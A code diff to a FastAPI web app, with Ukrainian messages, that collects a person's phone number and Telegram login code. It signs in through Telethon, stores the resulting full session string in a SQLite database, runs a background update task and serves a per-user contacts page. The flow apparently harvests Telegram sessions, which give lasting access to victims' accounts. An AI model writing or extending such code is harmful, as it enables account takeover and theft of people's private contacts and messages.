@@ -65,7 +65,9 @@ class PhonePayload(BaseModel):
     phone: str
 
 class CodePayload(BaseModel):
+    phone: str
     code: str
+
 
 @app.get("/")
 async def home(request: Request):
@@ -77,22 +79,21 @@ async def send_phone(data: PhonePayload):
     phone_number = data.phone.strip()
 
     try:
-        # створюємо клієнта з пустою StringSession
-        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=15, timeout=20)
+        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=15)
         await client.connect()
 
         if not await client.is_user_authorized():
             result = await client.send_code_request(phone_number)
             sessions[phone_number] = {
                 "phone_code_hash": result.phone_code_hash,
-                "phone": phone_number,
-                "session": client.session.save()  # зберігаємо проміжну сесію
+                "session": client.session.save()
             }
 
         await client.disconnect()
         return {"status": "code_sent"}
     except Exception as e:
-        return {"status": "error", "detail": str(e)}
+        print(e)
+        raise HTTPException(status_code=500, detail=str(e))
 
 
 async def update_user_task(phone_number: str):
@@ -114,15 +115,15 @@ from fastapi import HTTPException
 
 @app.post("/verify_code")
 async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
-    phone_number = next((k for k, v in sessions.items() if "phone_code_hash" in v), None)
-    if not phone_number:
-        raise HTTPException(status_code=400, detail="Send phone first.")
+    phone_number = data.phone.strip()
+
+    if phone_number not in sessions:
+        raise HTTPException(status_code=400, detail="Спочатку надішліть номер телефону.")
 
     phone_code_hash = sessions[phone_number]["phone_code_hash"]
     session_string = sessions[phone_number]["session"]
 
-    # відновлюємо клієнта з тимчасової сесії
-    client = TelegramClient(StringSession(session_string), API_ID, API_HASH, connection_retries=15, timeout=20)
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH, connection_retries=15)
     await client.connect()
 
     try:
@@ -130,31 +131,23 @@ async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
             try:
                 await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
             except SessionPasswordNeededError:
-                raise HTTPException(status_code=400, detail="2FA enabled. Not supported.")
+                raise HTTPException(status_code=400, detail="2FA увімкнено. Не підтримується.")
             except Exception:
                 raise HTTPException(status_code=400, detail="Невірний код")
 
-        # Перевіряємо користувача
         me = await client.get_me()
         if not me:
-            raise HTTPException(status_code=500, detail="Auth failed, get_me() returned None")
+            raise HTTPException(status_code=500, detail="Помилка авторизації.")
 
         username = me.username or f"{me.first_name}_{me.id}"
-        username = f"{username}_{phone_number.replace('+', '')}"
+        username = f"{username}_{phone_number.replace('+','')}"
 
-        # Отримуємо фінальну сесію
         full_session = client.session.save()
-
-        try:
-            tz = ZoneInfo("Europe/Kyiv")
-        except Exception:
-            tz = ZoneInfo("Europe/Kiev")
-
+        tz = ZoneInfo("Europe/Kyiv")
         now = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
 
-        # зберігаємо користувача в БД (оновлюємо або створюємо)
         async with aiosqlite.connect(DB_FILE, timeout=30) as db:
-            await db.execute(f"""
+            await db.execute("""
                 INSERT INTO users (username, phone, session_string, last_updated)
                 VALUES (?, ?, ?, ?)
                 ON CONFLICT(phone) DO UPDATE SET 
@@ -164,13 +157,17 @@ async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
             """, (username, phone_number, full_session, now))
             await db.commit()
 
-        # запускаємо бекграунд-задачу
+        # бекграундна задача
         background_tasks.add_task(update_user_task, phone_number)
+
+        # ✅ очищаємо тимчасову сесію
+        del sessions[phone_number]
 
     finally:
         await client.disconnect()
 
     return {"status": "ok"}
+
 
 
 @app.get("/user/{user_folder}/contacts", response_class=HTMLResponse)
